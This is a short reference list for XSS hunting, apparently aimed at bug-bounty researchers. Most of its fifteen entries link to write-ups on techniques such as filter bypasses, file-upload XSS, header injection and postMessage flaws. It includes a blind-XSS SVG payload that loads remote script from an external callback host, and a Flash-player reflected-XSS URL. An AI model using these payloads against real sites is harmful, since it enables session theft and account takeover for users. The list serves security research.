## 1. Browser's XSS Filter Bypass Cheat Sheet

https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

## 2. Stored XSS using file upload
https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e

## 3. XSS Through Parameter Pollution
https://infosecwriteups.com/xss-through-parameter-pollution-9a55da150ab2

## 4. XSS via HTTP Headers
https://brutelogic.com.br/blog/xss-via-http-headers/

## 5. Blind XSS in svg file
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC
  "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="200"
       height="200"
       zoomAndPan="disable"
       xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
       xml:space="preserve">
    <!-- Script linked from the outside-->
    <script xlink:href="https://smaul1.xss.ht" />
    <script>
      //<![CDATA[
        alert("Smaul");
      ]]>
    </script>
  </svg>
  ```

## 6. PostMessage XSS
```
https://medium.com/@youghourtaghannei/postmessage-xss-vulnerability-on-private-program-18e773e1a1ba
```
## 7. Flash Based Reflected XSS
```
http://www.domain.com/jwplayer/player.swf?playerready=alert(document.domain)
```
https://hackerone.com/reports/859806

## 8. XSS in .Net
https://blog.isec.pl/all-is-xss-that-comes-to-the-net/

## 9. DOMXSS WIKI
https://github.com/wisec/domxsswiki/wiki

## 10. Reflected XSS Through Insecure Dynamic Loading
https://infosecwriteups.com/reflected-xss-through-insecure-dynamic-loading-dbf4d33611e0

## 11. Uber Bug Bounty: Turning Self-XSS into Good-XSS
https://whitton.io/articles/uber-turning-self-xss-into-good-xss/

## 12. Multi Domain DOM Cross Site Scripting
https://coffeejunkie.me//Multi-Domain-DOM-Cross-Site-Scripting/

## 13. Hunting for XSS with CodeQL
https://medium.com/codex/hunting-for-xss-with-codeql-57f70763b938

## 14. PNG IDAT chunks XSS payload generator
https://github.com/vavkamil/xss2png

## 15. XSS to Account takeover in payu.in
https://blog.amanrawat.in/2021/02/01/xss-to-account-takeover-payu.html



